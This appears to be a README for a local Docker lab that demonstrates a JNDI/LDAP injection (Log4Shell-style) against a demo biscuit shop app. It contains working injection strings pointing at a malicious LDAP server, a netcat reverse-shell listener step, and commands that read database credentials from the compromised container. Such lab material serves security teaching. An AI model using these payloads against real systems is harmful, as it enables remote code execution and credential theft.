## Starting up the exploit

Run, in this order, the following commands : 

```bash
docker compose up -d database       # wait for the database to spinup
docker compose up application       # before launching application.
docker compose up snoopy-http-server
docker compose up snoopy-ldap-server
```

Connect to `http://localhost:8080` to access the biscuits shop frontend. 

Do the RCE via `${jndi:ldap://snoopy-ldap-server:1389/a}` 
Connect database container from shell via `mysql -h 127.0.0.1 -P 3306 -u root -p biscuits`
Query the spring LDAP authentication server via `ldapsearch -x -D "uid=ben,ou=people,dc=unige,dc=ch" -W -H ldap://0.0.0.0:8389 -b "ou=people,dc=unige,dc=ch" -s sub "uid=*"`
Query the malicious LDAP server via `ldapsearch -H ldap://0.0.0.0:1389 -b "dc=example,dc=com" -s sub -x "(objectclass=*)"`
Access the malicious http server at `http://localhost:8000`

### Remote Shell Exploit

Startup a netcat server to listen for an incoming TCP remote shell connection `docker compose run --name snoopy-netcat-listener snoopy-netcat-listener` and inject `${jndi:ldap://snoopy-ldap-server:1389/ExploitRCE}` once pwned,
you can get .env values via, 
```
echo $MYSQL_HOST
mysql-database
echo $MYSQL_ROOT_PASSWORD 
secret
```

IT IS ESSENTIAL TO NOT USE DOCKER COMPOSE UP SNOOPY-NETCAT-LISTENER, see [this SO thread](https://stackoverflow.com/questions/36249744/interactive-shell-using-docker-compose).

Dependencies : 

Working install of docker and docker compose. 